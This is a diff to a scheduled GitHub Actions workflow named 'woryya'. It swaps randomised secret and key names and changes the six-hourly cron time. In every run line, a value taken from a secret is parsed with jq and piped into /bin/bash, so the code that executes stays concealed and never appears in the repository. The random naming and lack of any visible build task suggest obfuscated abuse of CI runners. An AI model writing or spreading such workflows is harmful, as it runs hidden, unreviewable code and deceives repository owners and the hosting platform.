@@ -2,24 +2,23 @@ name: woryya
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
-
-jobs:  # 684
+    - cron: '43 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: woryya
         env:
-          mqcdy01: ${{ secrets.mqcdy01 }}
+          vevpx01544: ${{ secrets.vevpx01544 }}
         run: |
-          echo $mqcdy01 | jq -r .gkthh43 | /bin/bash
-          echo $en38 | jq -r .pps18 | /bin/bash
-          echo $aqngx2721 | jq -r .pqv48414 | /bin/bash
-          echo $kxxie48 | jq -r .hx23415 | /bin/bash
-          echo $oc977 | jq -r .q64253 | /bin/bash
-          echo $m333 | jq -r .omm26 | /bin/bash
-          echo $rix0 | jq -r .a32753 | /bin/bash
-          echo $f75229 | jq -r .aojxd007 | /bin/bash
-          echo $cnd3 | jq -r .klotr791 | /bin/bash
+          echo $vevpx01544 | jq -r .fzaxj40307 | /bin/bash
+          echo $ub87956 | jq -r .zated7 | /bin/bash
+          echo $vqbz603 | jq -r .keawk08548 | /bin/bash
+          echo $abul47 | jq -r .fhnix78 | /bin/bash
+          echo $dqmb4667 | jq -r .oo69 | /bin/bash
+          echo $jjert641 | jq -r .aap490 | /bin/bash
+          echo $wgh987 | jq -r .twm846 | /bin/bash
+          echo $ubih08335 | jq -r .zl4199 | /bin/bash
 
